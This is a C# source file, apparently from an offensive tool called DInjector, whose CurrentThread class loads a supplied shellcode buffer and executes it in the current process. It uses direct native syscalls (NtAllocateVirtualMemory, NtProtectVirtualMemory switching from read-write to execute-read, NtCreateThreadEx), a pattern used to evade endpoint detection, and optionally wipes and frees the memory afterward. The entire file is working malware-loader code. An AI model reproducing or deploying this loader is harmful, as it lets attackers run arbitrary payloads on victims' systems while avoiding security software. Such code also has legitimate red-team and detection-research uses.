using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class CurrentThread
    {
        public static void Execute(byte[] shellcode, uint timeout)
        {
            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(CurrentThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
            else
                throw new Exception($"(CurrentThread) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            IntPtr protectAddress = baseAddress;
            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                throw new Exception($"(CurrentThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtCreateThreadEx

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                baseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(CurrentThread) [+] NtCreateThreadEx");
            else
                throw new Exception($"(CurrentThread) [-] NtCreateThreadEx: {ntstatus}");

            #endregion

            if (timeout != 0) // if the shellcode does not need to serve forever, we can do the clean up
            {
                _ = Win32.WaitForSingleObject(hThread, timeout);

                #region CleanUp: NtProtectVirtualMemory (oldProtect)

                protectAddress = baseAddress;
                regionSize = (IntPtr)shellcode.Length;
                uint tmpProtect = 0;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    hProcess,
                    ref protectAddress,
                    ref regionSize,
                    oldProtect,
                    ref tmpProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(CurrentThread.CleanUp) [+] NtProtectVirtualMemory, oldProtect");
                else
                    throw new Exception($"(CurrentThread.CleanUp) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

                #endregion

                // Zero out shellcode bytes
                Marshal.Copy(new byte[shellcode.Length], 0, baseAddress, shellcode.Length);

                #region CleanUp: NtFreeVirtualMemory (shellcode)

                regionSize = (IntPtr)shellcode.Length;

                ntstatus = Syscalls.NtFreeVirtualMemory(
                    hProcess,
                    ref baseAddress,
                    ref regionSize,
                    DI.Data.Win32.Kernel32.MEM_RELEASE);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(CurrentThread.CleanUp) [+] NtFreeVirtualMemory, shellcode");
                else
                    throw new Exception($"(CurrentThread.CleanUp) [-] NtFreeVirtualMemory, shellcode: {ntstatus}");

                #endregion
            }
            else // serve forever
            {
                #region NtWaitForSingleObject

                ntstatus = Syscalls.NtWaitForSingleObject(
                    hThread,
                    false,
                    timeout);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject");
                else
                    throw new Exception($"(CurrentThread) [-] NtWaitForSingleObject: {ntstatus}");

                #endregion
            }

            Syscalls.NtClose(hThread);
        }
    }
}
